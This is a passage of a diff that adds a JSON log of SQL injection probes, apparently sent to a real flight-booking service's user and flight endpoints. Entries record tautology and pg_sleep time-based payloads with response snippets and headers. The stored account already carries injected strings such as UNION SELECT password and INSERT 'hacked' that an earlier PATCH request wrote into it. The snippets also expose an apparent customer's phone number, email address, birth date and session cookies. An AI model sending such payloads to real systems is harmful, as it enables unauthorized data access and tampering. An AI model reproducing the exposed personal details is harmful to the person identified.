+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906817,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT * FROM users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersio",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:27 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"c7e-EZYOBthQOvxTNZFkXy42Y08wZ7Y\"",
+        "set-cookie": "sails.sid=s%3AjEvwh8tjJyQ6h2qA6C4wT47qHE0nQtn0.l2ur2m4lqbBV9Nx%2BVuE15Lsv7fVgMvRN0GwOuuT24D0; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "GET",
+      "test_type": "user_query_id",
+      "params": {
+        "id": "' OR 1=1--"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 3198,
+      "elapsed_time": 0.1772305965423584,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906817,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT * FROM users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersio",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:27 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"c7e-EZYOBthQOvxTNZFkXy42Y08wZ7Y\"",
+        "set-cookie": "sails.sid=s%3Ag14HNiNZZ2FYgbF1i607uhnubwk4elF3.YDs9i8Lh0Mcu4A3t7hrhPaCb6qN%2BqsO%2B4kuu8RG9J%2Fs; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "GET",
+      "test_type": "user_query_id",
+      "params": {
+        "id": "' OR 'x'='x"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 3198,
+      "elapsed_time": 0.17629146575927734,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906817,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT * FROM users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersio",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:27 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"c7e-EZYOBthQOvxTNZFkXy42Y08wZ7Y\"",
+        "set-cookie": "sails.sid=s%3AbnZb8JDDl49i2dxml6UsEi2lhenqsivt.IV23fpIVgM49YhrMztH7h5uqTapCE57hvP%2B%2FzG0pfvM; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "GET",
+      "test_type": "user_query_search",
+      "params": {
+        "search": "' OR '1'='1"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 3198,
+      "elapsed_time": 0.29593706130981445,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906817,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT * FROM users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersio",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:28 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"c7e-EZYOBthQOvxTNZFkXy42Y08wZ7Y\"",
+        "set-cookie": "sails.sid=s%3AxOlJ6WGRofycRQ0QRQNSuhlOw7BcrxLC.1dZPSdhk7Cl2NuKGIiIrDJwwlu9IXKgC1PBPsvwIrp8; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "GET",
+      "test_type": "user_query_search",
+      "params": {
+        "search": "' OR 1=1--"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 3198,
+      "elapsed_time": 0.1798551082611084,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906817,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT * FROM users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersio",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:28 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"c7e-EZYOBthQOvxTNZFkXy42Y08wZ7Y\"",
+        "set-cookie": "sails.sid=s%3AfUTUuQkBvs-mVoLshpHteRJyYobIQo30.XG6mB0hqFDGflxPVj1Fe%2FDrb96Wv6twDOUNUEnufe7s; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "GET",
+      "test_type": "user_query_search",
+      "params": {
+        "search": "' OR 'x'='x"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 3198,
+      "elapsed_time": 0.17128229141235352,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906817,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT * FROM users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersio",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:28 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"c7e-EZYOBthQOvxTNZFkXy42Y08wZ7Y\"",
+        "set-cookie": "sails.sid=s%3A5a7v21wUt-3DlYY5gjjLzAAds1nkzeCB.9A45BsPldlV3EGXlIITYyLoseRTQAePcNGqCp3By7KE; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "GET",
+      "test_type": "user_query_filter",
+      "params": {
+        "filter": "' OR '1'='1"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 3198,
+      "elapsed_time": 0.15786099433898926,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906817,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT * FROM users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersio",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:28 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"c7e-EZYOBthQOvxTNZFkXy42Y08wZ7Y\"",
+        "set-cookie": "sails.sid=s%3Ah9jTDUfSS5MyMfDQiS7fZOjFuOVn1SqF.pzk5%2FfvKk0oG3c3w8fYTcCRTuvmVV4FqqrbGLdrVZAY; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "GET",
+      "test_type": "user_query_filter",
+      "params": {
+        "filter": "' OR 1=1--"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 3198,
+      "elapsed_time": 0.19043898582458496,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906817,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT * FROM users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersio",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:28 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"c7e-EZYOBthQOvxTNZFkXy42Y08wZ7Y\"",
+        "set-cookie": "sails.sid=s%3AjVCSNPIL68irOsaDYcoIhyoEaCveRn3y.61HGNdimj4%2FP3rhCv8cur43VzPmu7k%2FeLHVbBRQIaGE; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "GET",
+      "test_type": "user_query_filter",
+      "params": {
+        "filter": "' OR 'x'='x"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 3198,
+      "elapsed_time": 0.16017556190490723,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906817,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT * FROM users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersio",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:28 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"c7e-EZYOBthQOvxTNZFkXy42Y08wZ7Y\"",
+        "set-cookie": "sails.sid=s%3AipjdO4pseW53VjuGaj23PMDCsDCmX8Ng.ydWNG9gEv%2FjrUvmdnVodrkCXuafhje4epctLkBX1s4k; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "GET",
+      "test_type": "user_query_userId",
+      "params": {
+        "userId": "' OR '1'='1"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 3198,
+      "elapsed_time": 0.1611945629119873,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906817,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT * FROM users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersio",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:29 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"c7e-EZYOBthQOvxTNZFkXy42Y08wZ7Y\"",
+        "set-cookie": "sails.sid=s%3AuDx9VzDaXjfHzsLZaCBbTW6-6Lt8QLmr.%2FvK2F5gB4GXJp1s2XH2wG1Sszs58vEZoU%2FlcySVtajs; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "GET",
+      "test_type": "user_query_userId",
+      "params": {
+        "userId": "' OR 1=1--"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 3198,
+      "elapsed_time": 0.17475032806396484,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906817,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT * FROM users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersio",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:29 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"c7e-EZYOBthQOvxTNZFkXy42Y08wZ7Y\"",
+        "set-cookie": "sails.sid=s%3A6TUkTAVoykkH9WQ0XSZDpUwxicoQ_TrJ.RCuOO9Fh10%2B7Sqbu7jLUA7Pbey80LqlIBUeX0%2FsfaJE; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "GET",
+      "test_type": "user_query_userId",
+      "params": {
+        "userId": "' OR 'x'='x"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 3198,
+      "elapsed_time": 0.2815570831298828,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906817,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT * FROM users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersio",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:29 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"c7e-EZYOBthQOvxTNZFkXy42Y08wZ7Y\"",
+        "set-cookie": "sails.sid=s%3AwaFqJKXNpqZIwsebOJYLnA4VyoCXJjke.5b%2Bs9v2KGyfik1OzVH0zJjZtxlFNoEmKj1ZY9gGE7LQ; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "PATCH",
+      "test_type": "time_based_user_update",
+      "params": null,
+      "json_data": {
+        "firstName": "Sameer'; SELECT pg_sleep(5)--"
+      },
+      "status_code": 200,
+      "response_length": 2087,
+      "elapsed_time": 0.4088566303253174,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364909738,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"Sameer'; SELECT pg_sleep(5)--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersio",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:30 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"827-H83WTWvLLiIzAmcGjHDL7DTt4S4\"",
+        "set-cookie": "sails.sid=s%3AgKH4SXJSt-7XJHMCpWIRrNElwwppQCNA.c%2FePJO4SX%2F5rXDmDm6eR8pGH4x2eA4%2BtkPlC63bZVVk; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "PATCH",
+      "test_type": "time_based_user_update",
+      "params": null,
+      "json_data": {
+        "firstName": "Sameer' AND (SELECT 1 FROM pg_sleep(5))--"
+      },
+      "status_code": 200,
+      "response_length": 2099,
+      "elapsed_time": 0.3337836265563965,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364910161,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"Sameer' AND (SELECT 1 FROM pg_sleep(5))--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:30 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"833-1s3ePyK9cfIpgy4/XsBOttFj1qU\"",
+        "set-cookie": "sails.sid=s%3AFSC2IChRTy_2taIwT3OCv86ivAJvdLy1.w9wGxGb76%2FiuixDDIDI8l7XNM%2BXbmxNg3TDFyW4TRuo; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight",
+      "method": "GET",
+      "test_type": "flight_query_id",
+      "params": {
+        "id": "' OR '1'='1"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 297813,
+      "elapsed_time": 1.6323153972625732,
+      "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762364892518,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-09-27T14:00\",\"arriveDateTime\":null,\"arriveDateTimeLocal\":\"2024-09-27T14:48\",\"closeoutDateTime\":\"2024-09-26T19:00:00.000Z\",\"waitlistCloseAlertSent\":false,\"numberOfEntrants\":2,\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/002af750-a1b2-482e-9880-fca93dc3abb4.png\",\"charterPrice\":1600,\"",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:31 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"48b5a-L2cnbsMhG4daTMrP7RdyXIGQ+J4\"",
+        "set-cookie": "sails.sid=s%3ATm3PlRalePByiu7A-fWEo95fRlVv7N0w.%2BpHEPXt9dopcfD9cva9oUGvy4tGOHPVVlTjn5yzJTOU; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight",
+      "method": "GET",
+      "test_type": "flight_query_id",
+      "params": {
+        "id": "' OR 1=1--"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 299051,
+      "elapsed_time": 2.085723638534546,
+      "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762364892518,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-09-27T14:00\",\"arriveDateTime\":null,\"arriveDateTimeLocal\":\"2024-09-27T14:48\",\"closeoutDateTime\":\"2024-09-26T19:00:00.000Z\",\"waitlistCloseAlertSent\":false,\"numberOfEntrants\":2,\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/002af750-a1b2-482e-9880-fca93dc3abb4.png\",\"charterPrice\":1600,\"",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:34 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"49030-MR+vbJzqI0RBIpOcuA/jLFcdLmo\"",
+        "set-cookie": "sails.sid=s%3A3AmIdkv-oSzcFkLlyXvjLI7uDoNPxSIU.D%2FRIA44gDV3xxlcjKlD4ueguYjD84C9QSApcQFmkcsU; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight",
+      "method": "GET",
+      "test_type": "flight_query_id",
+      "params": {
+        "id": "' OR 'x'='x"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 298842,
+      "elapsed_time": 1.8824293613433838,
+      "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762364892518,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-09-27T14:00\",\"arriveDateTime\":null,\"arriveDateTimeLocal\":\"2024-09-27T14:48\",\"closeoutDateTime\":\"2024-09-26T19:00:00.000Z\",\"waitlistCloseAlertSent\":false,\"numberOfEntrants\":2,\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/002af750-a1b2-482e-9880-fca93dc3abb4.png\",\"charterPrice\":1600,\"",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:35 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"48f5f-jtZ2S9lQZLPN3QJt6Wd54O+2I4I\"",
+        "set-cookie": "sails.sid=s%3AaBP7hN2AnNk4v7_lMwKE6VNrksh5IwDZ.zNx22FKr3ZZ%2Bl%2FYdlWeir%2FIXtzgea%2BC2dosBZVlOxBE; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight",
+      "method": "GET",
+      "test_type": "flight_query_id",
+      "params": {
+        "id": "') OR ('1'='1"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 298843,
+      "elapsed_time": 1.657724380493164,
+      "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762364892518,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-09-27T14:00\",\"arriveDateTime\":null,\"arriveDateTimeLocal\":\"2024-09-27T14:48\",\"closeoutDateTime\":\"2024-09-26T19:00:00.000Z\",\"waitlistCloseAlertSent\":false,\"numberOfEntrants\":2,\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/002af750-a1b2-482e-9880-fca93dc3abb4.png\",\"charterPrice\":1600,\"",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:37 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"48f60-ySJLDFha8Z72D2zfgkoy/h7Hxzs\"",
+        "set-cookie": "sails.sid=s%3AHe6p_TtlhRyatwRX4xR2GUl-XULoUDgU.EV%2F05%2F85B0%2BvS%2Bx9%2FxHGCA9NSq0e26MWmTAlJxW3kPE; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight",
+      "method": "GET",
+      "test_type": "flight_query_status",
+      "params": {
+        "status": "' OR '1'='1"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 298843,
+      "elapsed_time": 1.8684144020080566,
+      "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762364892518,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-09-27T14:00\",\"arriveDateTime\":null,\"arriveDateTimeLocal\":\"2024-09-27T14:48\",\"closeoutDateTime\":\"2024-09-26T19:00:00.000Z\",\"waitlistCloseAlertSent\":false,\"numberOfEntrants\":2,\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/002af750-a1b2-482e-9880-fca93dc3abb4.png\",\"charterPrice\":1600,\"",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:39 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"48f60-ySJLDFha8Z72D2zfgkoy/h7Hxzs\"",
+        "set-cookie": "sails.sid=s%3AehH6cfFJMked07WCBinK_s99YjpnVVMG.KdLPFv3pK8Agakwqd9WnPJnpMsAEaIKQ1EFih2JYqU0; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight",
+      "method": "GET",
+      "test_type": "flight_query_status",
+      "params": {
+        "status": "' OR 1=1--"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 298843,
+      "elapsed_time": 1.6847732067108154,
+      "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762364892518,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-09-27T14:00\",\"arriveDateTime\":null,\"arriveDateTimeLocal\":\"2024-09-27T14:48\",\"closeoutDateTime\":\"2024-09-26T19:00:00.000Z\",\"waitlistCloseAlertSent\":false,\"numberOfEntrants\":2,\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/002af750-a1b2-482e-9880-fca93dc3abb4.png\",\"charterPrice\":1600,\"",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:41 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"48f60-ySJLDFha8Z72D2zfgkoy/h7Hxzs\"",
+        "set-cookie": "sails.sid=s%3ArZ8F-6qFZ_ZQe_ZI32z4Hmn61mHgSghw.jgniDOVF03Ka3GIn8Pq5MFw7TrmtdNaqhE88yUCxK0o; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight",
+      "method": "GET",
+      "test_type": "flight_query_status",
+      "params": {
